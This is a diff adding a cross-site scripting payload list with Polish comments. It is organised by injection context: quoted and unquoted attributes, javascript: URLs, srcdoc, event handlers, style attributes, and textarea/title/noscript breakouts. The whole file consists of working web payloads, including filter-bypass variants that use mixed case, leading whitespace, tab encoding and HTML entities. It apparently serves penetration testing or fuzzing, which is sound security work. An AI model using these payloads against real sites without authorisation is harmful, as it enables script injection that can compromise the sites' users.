@@ -1,0 +1,45 @@
+# === Wewnątrz wartości atrybutu z " ===
+# Domyka cudzysłów + nowy event handler + komentarz
+" autofocus onfocus=alert(1) x="
+" onmouseover=alert(1) "
+"><script>alert(1)</script>
+"><img src=x onerror=alert(1)>
+
+# === Wewnątrz wartości atrybutu z ' ===
+' autofocus onfocus=alert(1) x='
+' onmouseover=alert(1) '
+'><script>alert(1)</script>
+
+# === Bez cudzysłowów (atrybut nieotoczony) ===
+# value=USER_INPUT bez quotes
+x onmouseover=alert(1)
+/onmouseover=alert(1)//
+
+# === Atrybut href / src — javascript: ===
+javascript:alert(1)
+javascript:alert(1)//
+JaVaScRiPt:alert(1)
+# Z whitespace na początku (bypass startsWith check)
+ javascript:alert(1)
+%09javascript:alert(1)
+&#x6a;avascript:alert(1)
+
+# === srcdoc / data: ===
+"><iframe srcdoc="<script>alert(1)</script>">
+
+# === Bez breakout — pure event ===
+# Jeśli wstrzykujesz w atrybut typu onclick="USER"
+alert(1)
+alert(1);//
+'-alert(1)-'
+"-alert(1)-"
+
+# === Style attribute ===
+# Wewnątrz style="..." — expression() w starym IE / behavior:url()
+"><svg style="background:url(javascript:alert(1))"
+
+# === Wewnątrz <textarea> / <title> / <noscript> ===
+# Te kontenery wymagają zamknięcia tagu
+</textarea><script>alert(1)</script>
+</title><script>alert(1)</script>
+</noscript><script>alert(1)</script>
